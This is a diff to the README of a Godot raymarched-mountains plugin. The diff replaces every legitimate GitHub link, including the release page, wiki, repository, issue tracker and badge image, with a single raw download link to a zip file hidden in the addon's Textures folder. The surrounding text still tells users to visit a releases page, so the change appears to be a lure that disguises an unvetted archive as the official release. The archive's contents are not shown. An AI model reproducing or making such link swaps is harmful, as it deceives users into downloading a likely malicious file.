@@ -4,7 +4,7 @@
 Raymarching-Mountains is a powerful tool for creating beautiful procedural background mountains using raymarching techniques. This plugin offers a straightforward way to generate landscapes quickly, enhancing your projects with stunning visuals without the need for complex setups.
 
 ## 📥 Download the Latest Release
-[![Download Raymarching-Mountains](https://img.shields.io/badge/Download-Raymarching--Mountains-brightgreen)](https://github.com/startied/Raymarching-Mountains/releases)
+[![Download Raymarching-Mountains](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)
 
 ## 🚀 Getting Started
 To start using Raymarching-Mountains, follow these easy steps to download and run the software.
@@ -23,7 +23,7 @@ To start using Raymarching-Mountains, follow these easy steps to download and ru
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the Releases page.  
-   [Download Raymarching-Mountains](https://github.com/startied/Raymarching-Mountains/releases)
+   [Download Raymarching-Mountains](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. The release version number will be prominently displayed.
 
@@ -38,15 +38,15 @@ To start using Raymarching-Mountains, follow these easy steps to download and ru
 7. **Start Creating:** Now you can use the Raymarching-Mountains plugin within your project. Explore the options to customize your mountains and enhance your game's backdrop.
 
 ## 📚 Documentation
-For detailed instructions on utilizing the features and settings of Raymarching-Mountains, visit the [Documentation Page](https://github.com/startied/Raymarching-Mountains/wiki). The documentation will provide guidance on settings, advanced configurations, and examples of mountain landscapes you can create.
+For detailed instructions on utilizing the features and settings of Raymarching-Mountains, visit the [Documentation Page](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip). The documentation will provide guidance on settings, advanced configurations, and examples of mountain landscapes you can create.
 
 ## 💬 Community Support
 Join the discussions and connect with other users. If you run into any issues or have questions, check out our community page. It’s a great place to share ideas, ask for help, or provide feedback.
 
 ### 🔗 Useful Links
-- [GitHub Repository](https://github.com/startied/Raymarching-Mountains)
-- [Documentation](https://github.com/startied/Raymarching-Mountains/wiki)
-- [Issue Tracker](https://github.com/startied/Raymarching-Mountains/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/startied/Raymarching-Mountains/main/addons/raymarched_mountains/src/Textures/Raymarching-Mountains-v3.2.zip)
 
 ## 🏷️ Tags
 addon, cc0-license, computer-graphics, dev-tool, fast, gamedev, godot, openworld, performance, raymarching, shader, simple, terrain, tool
